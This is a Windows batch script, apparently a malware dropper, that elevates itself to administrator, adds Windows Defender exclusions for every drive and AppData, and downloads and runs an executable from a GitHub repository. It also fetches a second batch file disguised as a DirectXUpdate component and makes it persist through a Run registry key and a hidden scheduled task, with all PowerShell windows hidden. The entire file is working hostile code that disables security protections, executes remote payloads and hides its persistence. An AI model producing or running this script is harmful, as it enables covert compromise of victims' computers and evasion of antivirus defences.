@echo off
:: Run as admin check
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Exclude all real drives
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%L:\ (
        powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%L:\'"
    )
)

:: Exclude AppData
set "APPDATA_PATH=%USERPROFILE%\AppData"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: Download and run main payload
set "TARGET_FILE=%APPDATA_PATH%\Client-built.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"

if exist "%TARGET_FILE%" (
    start "" "%TARGET_FILE%"
) else (
    echo Failed to download main payload.
    exit /b 1
)

:: Prepare Java.bat in AppData\Logs
set "LOGS_FOLDER=%APPDATA%\Logs"
set "DirectXUpdate_BAT_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/DirectXUpdate.bat"
set "DirectXUpdate_BAT_FILE=%LOGS_FOLDER%\DirectXUpdate.bat"

if not exist "%LOGS_FOLDER%" (
    mkdir "%LOGS_FOLDER%"
)

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DirectXUpdate_BAT_URL%', '%DirectXUpdate_BAT_FILE%')"

if not exist "%DirectXUpdate_BAT_FILE%" (
    echo Failed to download DirectXUpdate.bat file.
    exit /b 1
)

:: Remove Task Manager "disabled" block if it exists
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "DirectXUpdate" /f >nul 2>&1

:: Add to registry startup (Run)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DirectXUpdate" /t REG_SZ /d "\"%DirectXUpdate_BAT_FILE%\"" /f

:: Add backup Scheduled Task (bypasses Task Manager disables)
SCHTASKS /Create /TN "DirectXUpdateHidden" /TR "\"%DirectXUpdate_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F

exit

:: Made By MrAboudi
:: v3
